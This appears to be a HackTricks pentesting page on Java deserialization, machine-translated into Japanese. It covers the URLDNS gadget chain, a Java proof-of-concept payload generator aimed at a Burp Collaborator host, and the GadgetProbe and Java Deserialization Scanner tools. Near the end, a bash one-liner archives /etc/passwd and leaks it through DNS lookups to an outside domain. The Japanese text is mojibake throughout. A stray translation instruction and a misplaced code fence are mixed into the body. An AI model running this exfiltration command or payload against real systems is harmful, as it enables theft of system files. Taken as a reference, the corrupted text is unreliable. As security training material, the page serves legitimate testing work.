# Java DNSãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã€GadgetProbeã€ãŠã‚ˆã³Javaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚­ãƒ£ãƒŠãƒ¼

## Java DNSãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã€GadgetProbeã€ãŠã‚ˆã³Javaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚­ãƒ£ãƒŠãƒ¼

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆ

ã‚¯ãƒ©ã‚¹`java.net.URL`ã¯`Serializable`ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã®ã‚¯ãƒ©ã‚¹ãŒã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå¯èƒ½ã§ã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
```java
public final class URL implements java.io.Serializable {
```
ã“ã®ã‚¯ãƒ©ã‚¹ã¯**èˆˆå‘³æ·±ã„æŒ¯ã‚‹èˆã„ã‚’ã—ã¾ã™ã€‚**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ã€Œ**2ã¤ã®ãƒ›ã‚¹ãƒˆã¯ã€ä¸¡æ–¹ã®ãƒ›ã‚¹ãƒˆåãŒåŒã˜IPã‚¢ãƒ‰ãƒ¬ã‚¹ã«è§£æ±ºã•ã‚Œã‚‹å ´åˆã«åŒç­‰ã¨è¦‹ãªã•ã‚Œã¾ã™**ã€ã€‚ã—ãŸãŒã£ã¦ã€URLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ**`equals`**ã¾ãŸã¯**`hashCode`**ã®**ã„ãšã‚Œã‹ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã™ãŸã³ã«ã€IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®DNSãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚**

**URL**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰**`hashCode`**é–¢æ•°ã‚’**å‘¼ã³å‡ºã™**ã®ã¯éå¸¸ã«ç°¡å˜ã§ã€ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹`HashMap`ã«æŒ¿å…¥ã™ã‚‹ã ã‘ã§ååˆ†ã§ã™ã€‚ã“ã‚Œã¯ã€`HashMap`ã®**`readObject`**é–¢æ•°ã®æœ€å¾Œã«ã“ã®ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã§ã™ï¼š
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
æ¬¡ã«ã€`HashMap`å†…ã®ã™ã¹ã¦ã®å€¤ã‚’ä½¿ç”¨ã—ã¦`putVal`ã‚’**å®Ÿè¡Œ**ã—ã¾ã™ã€‚ã—ã‹ã—ã€ã‚ˆã‚Šé‡è¦ãªã®ã¯ã€ã™ã¹ã¦ã®å€¤ã§`hash`ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ã§ã™ã€‚ä»¥ä¸‹ã¯`hash`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
ä»¥ä¸‹ã®ã‚ˆã†ã«è¦³å¯Ÿã§ãã‚‹ã‚ˆã†ã«ã€**`HashMap`**ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹éš›ã«ã¯ã€é–¢æ•°`hash`ãŒ**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã”ã¨ã«å®Ÿè¡Œã•ã‚Œ**ã€**`hash`**ã®å®Ÿè¡Œä¸­ã«ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®`.hashCode()`ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**URL**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å«ã‚€**`HashMap`**ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã¨ã€**URLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¯`.hashCode()`ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

ã§ã¯ã€`URLObject.hashCode()`ã®ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
ä»¥ä¸‹ã®ã‚ˆã†ã«ã€`URLObject`ãŒ`.hashCode()`ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€`hashCode(this)`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚æ¬¡ã«ã€ã“ã®é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
ä»¥ä¸‹ã¯ã€/hive/hacktricks/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.mdã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’è¿”ã—ã€ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã¨HTMLã®æ§‹æ–‡ã‚’æ­£ç¢ºã«ä¿ã¡ã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®è¨€è‘‰ã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã®æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®ã‚‚ã®ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

```
getHostAddressãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«å¯¾ã—ã¦å®Ÿè¡Œã•ã‚Œã€DNSã‚¯ã‚¨ãƒªãŒç™ºè¡Œã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®ã‚¯ãƒ©ã‚¹ã¯ã€**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**ãŒå¯èƒ½ã§ã‚ã‚‹ã“ã¨ã‚’**ç¤ºã™ãŸã‚ã«**ã€ã¾ãŸã¯æƒ…å ±ã‚’**æ¼æ´©**ã™ã‚‹ãŸã‚ã«ã€DNSã‚¯ã‚¨ãƒªã‚’**å®Ÿè¡Œ**ã™ã‚‹ãŸã‚ã«**æ‚ªç”¨**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼ˆã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œçµæœã‚’ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã«è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚

### URLDNSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚³ãƒ¼ãƒ‰ä¾‹

[ã“ã“ã§ysoserialã‹ã‚‰URDNSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ã€‚ãŸã ã—ã€ã‚³ãƒ¼ãƒ‰ã®ç†è§£ã‚’å®¹æ˜“ã«ã™ã‚‹ãŸã‚ã«ã€ysoserialã®ã‚‚ã®ã‚’ãƒ™ãƒ¼ã‚¹ã«ã—ãŸç‹¬è‡ªã®PoCã‚’ä½œæˆã—ã¾ã—ãŸã€‚
```
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### è¿½åŠ æƒ…å ±

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* å…ƒã®ã‚¢ã‚¤ãƒ‡ã‚¢ã§ã¯ã€Commons Collectionsã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦DNSã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒææ¡ˆã•ã‚Œã¾ã—ãŸãŒã€ã“ã‚Œã¯ææ¡ˆã•ã‚ŒãŸæ–¹æ³•ã‚ˆã‚Šã‚‚ä¿¡é ¼æ€§ãŒä½ã‹ã£ãŸã§ã™ã€‚ä»¥ä¸‹ã¯ãã®ãƒã‚¹ãƒˆã§ã™ï¼š[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)ã¯ã€Burp Suite App Storeï¼ˆExtenderï¼‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚

**GadgetProbe**ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®Javaã‚¯ãƒ©ã‚¹ã«ã„ãã¤ã‹ã®**Javaã‚¯ãƒ©ã‚¹ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹**ã‚’èª¿ã¹ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ—¢çŸ¥ã®è„†å¼±æ€§ã«**å¯¾ã—ã¦**è„†å¼±æ€§ãŒã‚ã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### å‹•ä½œåŸç†

**GadgetProbe**ã¯ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒã˜**DNSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’ä½¿ç”¨ã—ã¾ã™ãŒã€DNSã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹**å‰ã«**ä»»æ„ã®ã‚¯ãƒ©ã‚¹ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚**ä»»æ„ã®ã‚¯ãƒ©ã‚¹ãŒå­˜åœ¨ã™ã‚‹**å ´åˆã€**DNSã‚¯ã‚¨ãƒª**ãŒ**é€ä¿¡**ã•ã‚Œã€GadgetProbeã¯ã“ã®ã‚¯ãƒ©ã‚¹ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’è¨˜éŒ²ã—ã¾ã™ã€‚**DNS**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ**é€ä¿¡ã•ã‚Œãªã„**å ´åˆã€ã“ã‚Œã¯**ä»»æ„ã®ã‚¯ãƒ©ã‚¹ãŒæ­£å¸¸ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œãªã‹ã£ãŸ**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãã‚Œã¯å­˜åœ¨ã—ãªã„ã‹ã€**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå¯èƒ½/æ”»æ’ƒå¯èƒ½ã§ã¯ãªã„**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

GitHubå†…ã®[**GadgetProbeã«ã¯ã„ãã¤ã‹ã®ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)ãŒã‚ã‚Šã¾ã™ã€‚

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### è¿½åŠ æƒ…å ±

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

ã“ã®ã‚¹ã‚­ãƒ£ãƒŠã¯ã€Burp App Storeï¼ˆExtenderï¼‰ã‹ã‚‰**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã§ãã¾ã™ã€‚\
ã“ã®**æ‹¡å¼µæ©Ÿèƒ½**ã«ã¯ã€**ãƒ‘ãƒƒã‚·ãƒ–**ãŠã‚ˆã³**ã‚¢ã‚¯ãƒ†ã‚£ãƒ–**ãª**æ©Ÿèƒ½**ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒ‘ãƒƒã‚·ãƒ–

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€é€ä¿¡ã•ã‚ŒãŸã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’**ãƒ‘ãƒƒã‚·ãƒ–ã«ãƒã‚§ãƒƒã‚¯**ã—ã€**Javaã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãƒã‚¸ãƒƒã‚¯ãƒã‚¤ãƒˆ**ã‚’æ¢ã—ã€è¦‹ã¤ã‹ã£ãŸå ´åˆã«ã¯è„†å¼±æ€§ã®è­¦å‘Šã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

![](<../../.gitbook/assets/image (290).png>)

### ã‚¢ã‚¯ãƒ†ã‚£ãƒ–

**æ‰‹å‹•ãƒ†ã‚¹ãƒˆ**

ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é¸æŠã—ã€å³ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã€ŒSend request to DS - Manual Testingã€ã‚’é¸æŠã—ã¾ã™ã€‚\
æ¬¡ã«ã€_Deserialization Scanner Tab_ --> _Manual testing tab_ å†…ã§**æŒ¿å…¥ãƒã‚¤ãƒ³ãƒˆ**ã‚’é¸æŠã—ã€**ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œ**ã—ã¾ã™ï¼ˆä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã«å¿œã˜ã¦é©åˆ‡ãªæ”»æ’ƒã‚’é¸æŠã—ã¾ã™ï¼‰ã€‚

![](../../.gitbook/assets/3-1.png)

ã“ã‚Œã¯ã€Œæ‰‹å‹•ãƒ†ã‚¹ãƒˆã€ã¨å‘¼ã°ã‚Œã¦ã„ã¾ã™ãŒã€ã‹ãªã‚Š**è‡ªå‹•åŒ–**ã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ä¸Šã§åˆ©ç”¨å¯èƒ½ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã—ã€**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ãŒ**ã©ã®ysoserialãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã«å¯¾ã—ã¦**è„†å¼±**ã‹ã‚’è‡ªå‹•çš„ã«ãƒã‚§ãƒƒã‚¯ã—ã€è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’å¼·èª¿è¡¨ç¤ºã—ã¾ã™ã€‚**è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒª**ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«ã¯ã€**Javas Sleeps**ã€**CPU**ã®æ¶ˆè²»ã«ã‚ˆã‚‹**sleeps**ã€ã¾ãŸã¯å…ˆã«è¿°ã¹ãŸã‚ˆã†ã«**DNS**ã‚’ä½¿ç”¨ã—ã¦èµ·å‹•ã™ã‚‹ã‚ˆã†ã«é¸æŠã§ãã¾ã™ã€‚

**æ”»æ’ƒ**

è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç‰¹å®šã—ãŸã‚‰ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’_Exploiting Tab_ã«é€ä¿¡ã§ãã¾ã™ã€‚\
ã“ã®ã‚¿ãƒ–ã§ã¯ã€å†ã³**æŒ¿å…¥ãƒã‚¤ãƒ³ãƒˆ**ã‚’é¸æŠã—ã€**ä½œæˆã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã¨**ã‚³ãƒãƒ³ãƒ‰**ã‚’å…¥åŠ›ã—ã¾ã™ã€‚ãã®å¾Œã€é©åˆ‡ãª**Attack**ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã ã‘ã§ã™ã€‚

![](<../../.gitbook/assets/4 (1).png>)

### Java Deserialization DNS Exfilæƒ…å ±

ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«ã—ã¦ãã ã•ã„ï¼š
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### è©³ç´°æƒ…å ±

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
